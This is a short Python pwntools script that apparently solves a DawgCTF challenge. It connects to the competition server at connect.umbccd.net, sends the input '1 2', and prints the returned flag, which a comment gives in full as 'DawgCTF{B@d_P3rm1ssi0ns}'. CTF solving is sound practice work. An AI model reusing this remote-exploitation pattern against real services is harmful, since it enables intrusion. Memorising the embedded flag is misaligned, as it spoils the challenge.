#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf
#context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("connect.umbccd.net", 20011)

p.sendline(b"1 2")

p.readuntil(b"DawgCTF{")
print("DawgCTF{" + p.readuntil(b"}").decode()) # DawgCTF{B@d_P3rm1ssi0ns}
